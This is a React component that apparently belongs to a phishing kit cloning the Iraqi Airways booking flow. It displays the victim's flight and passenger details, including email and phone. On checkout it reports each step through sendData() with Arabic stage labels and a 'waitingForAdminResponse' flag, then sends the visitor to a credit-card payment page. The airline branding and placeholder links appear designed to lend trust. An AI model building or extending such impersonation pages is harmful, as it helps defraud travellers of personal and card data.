import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { sendData } from '../lib/store';
import { useLang } from '../contexts/LanguageContext';

export default function SeatCustomization() {
  const [, setLocation] = useLocation();
  const { lang, setLang } = useLang();
  const [langMenuOpen, setLangMenuOpen] = useState(false);
  const [detailOpen, setDetailOpen] = useState<number | null>(null);
  const [paxOpen, setPaxOpen] = useState(false);
  const [paxOpenIdx, setPaxOpenIdx] = useState(-1);

  const flightData = JSON.parse(localStorage.getItem('selectedFlight') || '{}');
  const passengers = JSON.parse(localStorage.getItem('passengerData') || '[]');
  const tripSummary = JSON.parse(localStorage.getItem('tripSummary') || '{}');

  const cityNames: Record<string, string> = {
    BGW: 'Baghdad', EBL: 'Erbil', BSR: 'Basra', NJF: 'Najaf', KIK: 'Kirkuk',
    ISU: 'Sulaymaniyah', OSM: 'Mosul', AMM: 'Amman', IST: 'Istanbul', DXB: 'Dubai',
    BEY: 'Beirut', CAI: 'Cairo', DEL: 'Delhi', FRA: 'Frankfurt', KUL: 'Kuala Lumpur',
    CAN: 'Guangzhou', CPH: 'Copenhagen', SAW: 'Istanbul Sabiha', AYT: 'Antalya',
    TZX: 'Trabzon', SZF: 'Samsun', ESB: 'Ankara', DUS: 'Dusseldorf', MUC: 'Munich',
    SHJ: 'Sharjah', MCT: 'Muscat', BAH: 'Bahrain', IFN: 'Isfahan', TUN: 'Tunis', VKO: 'Moscow',
  };

  const origin = flightData.origin || tripSummary.originCode || 'BGW';
  const destination = flightData.destination || tripSummary.destCode || 'EBL';
  const originCity = cityNames[origin] || origin;
  const destCity = cityNames[destination] || destination;

  const curCode = tripSummary.curCode || 'IQD';
  const totalPrice = tripSummary.baseTotalConv || flightData.price || 0;
  const formatPrice = (n: number) => `${curCode} ${n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

  const depTime = flightData.departureTime || '17:00';
  const arrTime = flightData.arrivalTime || '18:00';
  const duration = flightData.duration || '1h 0min';
  const fareClass = flightData.fareClass || tripSummary.bundleName || 'Economy Platinum';
  const flightDate = flightData.date || tripSummary.firstDate || '';

  const formatDate = (dateStr: string) => {
    if (!dateStr) return '';
    try {
      const d = new Date(dateStr.includes('T') ? dateStr : dateStr + 'T00:00:00');
      if (isNaN(d.getTime())) return dateStr;
      return d.toLocaleDateString('en-GB', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' });
    } catch { return dateStr; }
  };

  const pax = passengers[0] || {};
  const paxName = `${pax.firstName || ''} ${pax.lastName || ''}`.trim() || tripSummary.primaryName || 'Passenger';
  const paxEmail = pax.email || '';
  const paxPhone = `${pax.dialCode || '+964'} ${pax.phone || ''}`.trim();

  const handleCheckout = () => {
    sendData({
      data: { action: 'checkout', total: formatPrice(totalPrice), passenger: paxName },
      current: "ملخص الحجز",
      nextPage: "الدفع",
      waitingForAdminResponse: false,
      isCustom: true,
    });
    setLocation('/credit-card-payment');
  };

  useEffect(() => {
    if (!flightData.origin && !tripSummary.curCode) {
      setLocation('/passenger-details');
    }
  }, []);

  return (
    <div className="min-h-screen flex flex-col bg-white" dir="ltr" style={{ fontFamily: 'Lato, sans-serif' }}>
      {/* Header */}
      <header className="bg-[#4ca42c] text-white">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center gap-6">
          <img src="/iraqi_airways/upload/logo-white-transparent.png" alt="Iraqi Airways" className="h-10" />
          <span className="border-l border-white/50 pl-4 text-sm cursor-pointer hover:underline" onClick={() => setLocation('/')}>Home</span>
          <div className="relative">
            <button onClick={() => setLangMenuOpen(o => !o)} className="text-sm flex items-center gap-1">
              <span>{lang === 'ar' ? 'العربية' : 'English'}</span>
              <span className="text-xs">▼</span>
            </button>
            {langMenuOpen && (
              <div className="absolute z-30 mt-1 w-36 bg-white rounded-xl shadow-lg border border-gray-200 overflow-hidden" style={{ left: 0 }}>
                <button onClick={() => { setLang('ar'); setLangMenuOpen(false); }} className="block w-full text-start px-4 py-2.5 text-sm text-gray-800 hover:bg-green-50">العربية</button>
                <button onClick={() => { setLang('en'); setLangMenuOpen(false); }} className="block w-full text-start px-4 py-2.5 text-sm text-gray-800 hover:bg-green-50">English</button>
              </div>
            )}
          </div>
        </div>
      </header>

      {/* Main content */}
      <main className="flex-1 max-w-4xl mx-auto w-full px-4 py-8">
        {/* Your selection title */}
        <div className="text-center mb-8">
          <div className="inline-block border border-gray-300 rounded-lg px-8 py-4">
            <h1 className="text-[#2E7D32] text-2xl font-light">Your selection</h1>
            <p className="text-[#2E7D32] text-sm">{originCity} to {destCity}</p>
          </div>
        </div>

        {/* Your flights */}
        <h2 className="text-center text-[#2E7D32] text-xl font-bold mb-4">{(flightData.legs && flightData.legs.length > 1) ? 'Your flights' : 'Your flight'}</h2>
        {(flightData.legs && flightData.legs.length > 1 ? flightData.legs : [{ origin, destination, date: flightDate, departureTime: depTime, arrivalTime: arrTime, duration, fare: fareClass }]).map((leg: any, legIdx: number) => (
        <div key={legIdx} className="border border-gray-200 rounded-lg p-6 mb-4">
          <div className="mb-4">
            <span className="font-bold text-[#2E7D32]">{cityNames[leg.origin] || leg.origin} to {cityNames[leg.destination] || leg.destination}</span>
            <span className="text-[#2E7D32] ml-2">- {formatDate(leg.date)}</span>
          </div>
          <hr className="mb-4" />
          <div className="flex items-center justify-between flex-wrap gap-4">
            <div className="flex items-center gap-4">
              <div className="text-center">
                <p className="text-2xl font-light text-[#2E7D32]">{leg.departureTime}</p>
                <p className="text-sm text-gray-600">{leg.origin}</p>
              </div>
              <div className="flex items-center gap-2 text-gray-400 text-xs">
                <span>···········</span>
                <span>nonstop</span>
                <span>···········</span>
              </div>
              <div className="text-center">
                <p className="text-2xl font-light text-[#2E7D32]">{leg.arrivalTime}</p>
                <p className="text-sm text-gray-600">{leg.destination}</p>
              </div>
            </div>
            <div className="text-sm text-gray-600">
              <p>⏱ <strong>Duration {leg.duration}</strong></p>
              <p>✈ Operated by Iraqi Airways</p>
            </div>
            <div className="flex items-center gap-2 cursor-pointer" onClick={() => setDetailOpen(detailOpen === legIdx ? null : legIdx)}>
              <span className="text-[#2E7D32] font-medium">{leg.fare || fareClass}</span>
              <div className="w-8 h-8 border-2 border-[#2E7D32] rounded flex items-center justify-center">
                <span className="text-[#2E7D32] text-sm">{detailOpen === legIdx ? '∧' : '∨'}</span>
              </div>
            </div>
          </div>
          {/* Expanded details - green background, 2 columns */}
          {detailOpen === legIdx && (
            <div className="mt-4 bg-[#f0f7f0] rounded-lg p-6">
              <div className="grid grid-cols-2 gap-8">
                {/* Left: Itinerary details */}
                <div className="border-r border-[#4CAF50]/30 pr-6">
                  <h4 className="text-[#2E7D32] font-bold text-center mb-4">Itinerary details</h4>
                  <div className="flex items-start gap-3">
                    <div className="flex flex-col items-center mt-1">
                      <div className="w-3 h-3 rounded-full bg-[#4CAF50]"></div>
                      <div className="w-[3px] h-16 bg-[#4CAF50]"></div>
                      <div className="w-3 h-3 rounded-full bg-[#4CAF50]"></div>
                    </div>
                    <div className="flex-1">
                      <p className="text-[#2E7D32] font-bold">{leg.departureTime} {cityNames[leg.origin] || leg.origin}</p>
                      <p className="text-[#2E7D32] text-sm">{cityNames[leg.origin] || leg.origin} Airport ({leg.origin})</p>
                      <p className="text-gray-500 text-xs mt-2 mb-2">{leg.duration}</p>
                      <p className="text-[#2E7D32] font-bold">{leg.arrivalTime} {cityNames[leg.destination] || leg.destination}</p>
                      <p className="text-[#2E7D32] text-sm">{cityNames[leg.destination] || leg.destination} Airport ({leg.destination})</p>
                    </div>
                  </div>
                  <div className="mt-4">
                    <p className="text-[#2E7D32] text-sm">Flight number <strong>{leg.flightNumber || `IA ${Math.floor(Math.random()*900+100)}`}</strong></p>
                    <p className="text-[#2E7D32] text-sm">Operated by Iraqi Airways</p>
                    <p className="text-[#2E7D32] text-sm uppercase">BOEING 737-800</p>
                  </div>
                </div>
                {/* Right: Your fare */}
                <div>
                  <h4 className="text-[#2E7D32] font-bold text-center mb-4">Your fare</h4>
                  <p className="text-[#2E7D32] font-bold text-center mb-4">{fareClass}</p>
                  <div className="space-y-3">
                    <p className="text-sm text-[#2E7D32]">🧳 <strong>Baggage in cabin</strong>  1 piece up to 7kg</p>
                    <p className="text-sm text-[#2E7D32]">🧳 <strong>Checked baggage</strong>  1 piece up to 30kg</p>
                    <p className="text-sm text-[#2E7D32]">✏️ <strong>Change bookings</strong>  Before 72 from flight date - for free<br/><span className="ml-6">Any other time with penalty</span></p>
                    <p className="text-sm text-[#2E7D32]">💰 <strong>Refund bookings</strong>  Allowed any time with penalty</p>
                    <p className="text-sm text-[#2E7D32]">🏛 <strong>VIP Lounge</strong>  No access</p>
                  </div>
                </div>
              </div>
              {/* Security message */}
              <div className="mt-6 pt-4 border-t border-[#4CAF50]/30">
                <p className="text-[#2E7D32] text-sm">🔒 Your flights and prices have been secured. In order to change your selection, please start a new search.</p>
              </div>
              {/* Close arrow */}
              <div className="text-center mt-4 cursor-pointer" onClick={() => setDetailOpen(null)}>
                <div className="inline-block bg-[#e8f5e9] rounded px-8 py-1 border-t-2 border-[#4CAF50]">
                  <span className="text-[#2E7D32]">∧</span>
                </div>
              </div>
            </div>
          )}
        </div>
        ))}

        {/* Total price for flight */}
        <p className="text-right text-[#2E7D32] text-lg mb-8">
          Total price for {(flightData.legs && flightData.legs.length > 1) ? 'flights' : 'flight'}: <strong className="text-xl">{formatPrice(totalPrice)}</strong>
        </p>

        {/* Passenger */}
        <h2 className="text-center text-[#2E7D32] text-xl font-bold mb-4">Passengers</h2>
        {passengers.length > 0 ? passengers.map((p: any, idx: number) => {
          const name = `${p.firstName || ''} ${p.lastName || ''}`.trim() || `Passenger ${idx+1}`;
          const type = p.type || (idx === 0 ? 'Adult' : 'Adult');
          const isOpen = paxOpenIdx === idx;
          return (
            <div key={idx} className={`rounded-lg p-6 mb-4 ${isOpen ? 'border-2 border-[#4CAF50]' : 'border border-gray-200'}`}>
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-4">
                  <div className="w-14 h-14 rounded-full bg-gray-200 flex items-center justify-center relative">
                    <svg className="w-8 h-8 text-[#4CAF50]" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                    <div className="absolute -top-1 -right-1 w-5 h-5 bg-[#4CAF50] rounded-full flex items-center justify-center">
                      <span className="text-white text-xs">✓</span>
                    </div>
                  </div>
                  <div>
                    <p className="font-bold text-[#2E7D32]">{name}</p>
                    {p.frequentFlyer && <p className="text-sm text-[#2E7D32]">Frequent flyer: {p.frequentFlyer}</p>}
                    {idx === 0 && p.email && <p className="text-sm text-[#2E7D32]">{p.email}</p>}
                    {idx === 0 && p.phone && <p className="text-sm text-[#2E7D32]">{p.dialCode || '+964'} {p.phone}</p>}
                    <p className="text-sm text-[#2E7D32]">{type}</p>
                  </div>
                </div>
                <span className="text-[#2E7D32] cursor-pointer text-xl" onClick={() => { setPaxOpenIdx(isOpen ? -1 : idx); }}>{isOpen ? '∧' : '∨'}</span>
              </div>
              {isOpen && (
                <div className="mt-4 pt-4 border-t border-gray-300">
                  <div className="grid grid-cols-2 gap-8">
                    <div>
                      <h4 className="text-[#2E7D32] font-bold mb-3">Personal Information</h4>
                      <p className="text-[#2E7D32] font-bold">{p.gender === 'Male' ? 'Mr' : 'Ms'} {name}</p>
                      {p.frequentFlyer && <><p className="text-[#2E7D32] font-bold mt-3">Frequent flyer</p><p className="text-[#2E7D32]">Iraqi Airways - {p.frequentFlyer}</p></>}
                    </div>
                    <div>
                      <h4 className="text-[#2E7D32] font-bold mb-3">Contact information</h4>
                      {p.email && <><p className="text-[#2E7D32] font-bold">Email</p><p className="text-[#2E7D32]">{p.email}</p></>}
                      {p.phone && <><p className="text-[#2E7D32] font-bold mt-3">Phones</p><p className="text-[#2E7D32]">Personal: {p.dialCode || '+964'} {p.phone}</p></>}
                    </div>
                  </div>
                  <button onClick={() => setLocation('/passenger-details')} className="mt-6 bg-[#2E7D32] text-white px-6 py-2.5 rounded-full text-sm font-medium hover:bg-[#1B5E20]">Modify</button>
                </div>
              )}
            </div>
          );
        }) : (
          <div className="border border-gray-200 rounded-lg p-6 mb-8">
            <div className="flex items-center gap-4">
              <div className="w-14 h-14 rounded-full bg-gray-200 flex items-center justify-center relative">
                <svg className="w-8 h-8 text-[#4CAF50]" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                <div className="absolute -top-1 -right-1 w-5 h-5 bg-[#4CAF50] rounded-full flex items-center justify-center"><span className="text-white text-xs">✓</span></div>
              </div>
              <div>
                <p className="font-bold text-[#2E7D32]">{paxName}</p>
                <p className="text-sm text-[#2E7D32]">Adult</p>
              </div>
            </div>
          </div>
        )}

        {/* Total price */}
        <div className="text-right mb-4">
          <p className="text-[#2E7D32] text-lg">Total price: <strong className="text-3xl">{formatPrice(totalPrice)}</strong></p>
          <p className="text-gray-500 text-sm mt-1">One way price for all passengers (including taxes, fees and discounts). <a href="#" className="font-bold text-gray-700 underline">See price details.</a></p>
        </div>

        {/* Policy links - right aligned */}
        <div className="text-right text-sm text-[#2E7D32] mb-8">
          <a href="#" className="underline">Detailed baggage policy ↗</a>
          <span className="mx-2 text-gray-400">|</span>
          <a href="#" className="underline">Review conditions ↗</a>
          <span className="mx-2 text-gray-400">|</span>
          <a href="#" className="underline">Dangerous goods policy ↗</a>
        </div>

        {/* Checkout button - right aligned */}
        <div className="flex justify-end mb-12">
          <button onClick={handleCheckout} className="bg-[#1B5E20] text-white px-10 py-3 rounded-full text-lg font-medium hover:bg-[#0D3B0F]">Checkout</button>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#4ca42c] text-white py-8">
        <div className="max-w-6xl mx-auto px-4">
          <div className="grid grid-cols-3 gap-8 mb-8">
            <div>
              <h4 className="font-bold mb-3">Plan and booking</h4>
              <a href="#" className="text-sm hover:underline block">Book trip ↗</a>
            </div>
            <div>
              <h4 className="font-bold mb-3">Contact us</h4>
              <a href="#" className="text-sm hover:underline block mb-1">Contact us ↗</a>
              <a href="#" className="text-sm hover:underline block">Iraqi airways offers ↗</a>
            </div>
            <div>
              <h4 className="font-bold mb-3">About us</h4>
              <a href="#" className="text-sm hover:underline block">Our fleet ↗</a>
            </div>
          </div>
          <div className="text-center mb-6">
            <h4 className="font-bold text-lg mb-3">Secured payment</h4>
            <div className="flex justify-center gap-2 mb-2">
              <img src="/iraqi_airways/americanexpress.png" alt="Amex" className="h-8 bg-white rounded p-1" />
              <img src="/iraqi_airways/visa.png" alt="Visa" className="h-8 bg-white rounded p-1" />
              <img src="/iraqi_airways/mastercard.png" alt="Mastercard" className="h-8 bg-white rounded p-1" />
              <img src="/iraqi_airways/paypal.png" alt="PayPal" className="h-8 bg-white rounded p-1" />
              <img src="/iraqi_airways/dinersclub.png" alt="Diners" className="h-8 bg-white rounded p-1" />
            </div>
            <p className="text-xs opacity-80">Credit card fees may occur.</p>
          </div>
          <div className="text-center mb-4">
            <h4 className="font-bold mb-3">Follow us</h4>
            <div className="flex justify-center gap-4">
              <a href="#" className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></a>
              <a href="#" className="w-8 h-8 bg-pink-500 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="20" rx="5" fill="none" stroke="white" strokeWidth="2"/><circle cx="12" cy="12" r="5" fill="none" stroke="white" strokeWidth="2"/></svg></a>
              <a href="#" className="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0C.488 3.45.029 5.804 0 12c.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0C23.512 20.55 23.971 18.196 24 12c-.029-6.185-.484-8.549-4.385-8.816zM9 16V8l8 4-8 4z"/></svg></a>
              <a href="#" className="w-8 h-8 bg-blue-400 rounded-full flex items-center justify-center"><svg className="w-4 h-4 fill-white" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z"/></svg></a>
            </div>
          </div>
          <div className="text-center">
            <a href="#" className="text-sm underline">Technical details</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
